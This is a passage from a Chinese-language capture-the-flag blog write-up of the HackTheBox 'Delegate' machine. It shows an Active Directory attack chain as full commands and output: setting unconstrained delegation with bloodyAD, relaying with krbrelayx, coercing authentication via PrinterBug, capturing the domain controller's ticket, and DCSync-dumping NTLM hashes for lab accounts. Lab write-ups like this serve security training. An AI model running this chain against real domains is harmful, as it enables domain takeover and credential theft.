+</span></span><span style="display:flex;"><span>└─$ bloodyAD -d $domain -u $user2 -p $pass2 --host $FQDN add uac <span style="color:#e6db74">&#39;FS01$&#39;</span> -f TRUSTED_FOR_DELEGATION
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;TRUSTED_FOR_DELEGATION&#39;</span><span style="color:#f92672">]</span> property flags added to FS01$<span style="color:#960050;background-color:#1e0010">&#39;</span>s userAccountControl
+</span></span></code></pre></div><p>启动中继监听</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tools/ad-tools/krbrelayx/krbrelayx-master<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 krbrelayx.py -hashes :58826d80a57b1527e373616eec499b06
+</span></span><span style="display:flex;"><span>/home/wackymaker/tools/ad-tools/krbrelayx/krbrelayx-master/lib/servers/smbrelayserver.py:429: SyntaxWarning: invalid escape sequence <span style="color:#e6db74">&#39;\%&#39;</span>
+</span></span><span style="display:flex;"><span>  LOG.error<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Authenticating against %s://%s as %s\%s FAILED&#34;</span> % <span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>/home/wackymaker/tools/ad-tools/krbrelayx/krbrelayx-master/lib/servers/smbrelayserver.py:441: SyntaxWarning: invalid escape sequence <span style="color:#e6db74">&#39;\%&#39;</span>
+</span></span><span style="display:flex;"><span>  LOG.info<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Authenticating against %s://%s as %s\%s SUCCEED&#34;</span> % <span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>/home/wackymaker/tools/ad-tools/krbrelayx/krbrelayx-master/lib/servers/smbrelayserver.py:516: SyntaxWarning: invalid escape sequence <span style="color:#e6db74">&#39;\%&#39;</span>
+</span></span><span style="display:flex;"><span>  LOG.info<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Authenticating against %s://%s as %s\%s SUCCEED&#34;</span> % <span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Protocol Client LDAP loaded..
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Protocol Client LDAPS loaded..
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Protocol Client HTTPS loaded..
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Protocol Client HTTP loaded..
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Protocol Client SMB loaded..
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running in export mode <span style="color:#f92672">(</span>all tickets will be saved to disk<span style="color:#f92672">)</span>. Works with unconstrained delegation attack only.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running in unconstrained delegation abuse mode using the specified credentials.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Setting up SMB Server
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Setting up HTTP Server on port <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Setting up DNS Server
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Servers started, waiting <span style="color:#66d9ef">for</span> connections
+</span></span></code></pre></div><p>在另外一边触发一个可用强制认证</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u <span style="color:#e6db74">&#34;FS01</span>$<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#39;wackwack1$&#39;</span> -M coerce_plus -o LISTENER<span style="color:#f92672">=</span>FS01.$domain METHOD<span style="color:#f92672">=</span>PrinterBug
+</span></span><span style="display:flex;"><span>/home/wackymaker/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span style="color:#66d9ef">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span style="display:flex;"><span>  from pkg_resources import resource_filename
+</span></span><span style="display:flex;"><span>SMB         10.129.6.221    <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:delegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.6.221    <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> delegate.vl<span style="color:#ae81ff">\F</span>S01$:wackwack1$ 
+</span></span><span style="display:flex;"><span>COERCE_PLUS 10.129.6.221    <span style="color:#ae81ff">445</span>    DC1              VULNERABLE, PrinterBug
+</span></span><span style="display:flex;"><span>COERCE_PLUS 10.129.6.221    <span style="color:#ae81ff">445</span>    DC1              Exploit Success, spoolss<span style="color:#ae81ff">\R</span>pcRemoteFindFirstPrinterChangeNotificationEx
+</span></span></code></pre></div><p>成功触发后，监听器出现回显</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>*<span style="color:#f92672">]</span> Servers started, waiting <span style="color:#66d9ef">for</span> connections
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD: Received connection from 10.129.3.28
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got ticket <span style="color:#66d9ef">for</span> DC1$@DELEGATE.VL <span style="color:#f92672">[</span>krbtgt@DELEGATE.VL<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD: Received connection from 10.129.3.28
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Unsupported MechType <span style="color:#e6db74">&#39;NTLMSSP - Microsoft NTLM Security Support Provider&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD: Received connection from 10.129.3.28
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Unsupported MechType <span style="color:#e6db74">&#39;NTLMSSP - Microsoft NTLM Security Support Provider&#39;</span>
+</span></span></code></pre></div><p>成功截获tgt</p>
+<p>直接利用票据打dcsync获取管理hash即可</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>KRB5CCNAME<span style="color:#f92672">=</span>DC1<span style="color:#ae81ff">\$</span>@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache netexec smb dc1.delegate.vl --use-kcache --ntds
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:delegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Guest Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DELEGATE.VL<span style="color:#ae81ff">\D</span>C1$ from ccache 
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dumping the NTDS, this could take a <span style="color:#66d9ef">while</span> so go grab a redbull...
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dumped <span style="color:#ae81ff">11</span> NTDS hashes to /home/oxdf/.nxc/logs/ntds/dc1.delegate.vl_None_2025-09-12_133554.ntds of which <span style="color:#ae81ff">8</span> were added to the database
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> To extract only enabled accounts from the output file, run the following command: 
+</span></span><span style="display:flex;"><span>SMB         dc1.delegate.vl <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> cat /home/oxdf/.nxc/logs/ntds/dc1.delegate.vl_None_2025-09-12_133554.ntds | grep 
+</span></span></code></pre></div><p>之后hash登陆即可</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a>
+        
+            <a href="/tags/htb/">Htb</a>
+        
+            <a href="/tags/%E5%9F%9F%E4%B9%8B%E9%AD%94%E6%B3%95/">域之魔法</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/redelegate/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Redelegate-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/baby/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">baby-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/sendai/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">sendai-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/scepter/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">scepter-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/sweep-htb/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">sweep-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 wackymaker
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.9feb0937132291db314540e31350de0da717928ca87e53cdebf73f0dfcdc569c.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
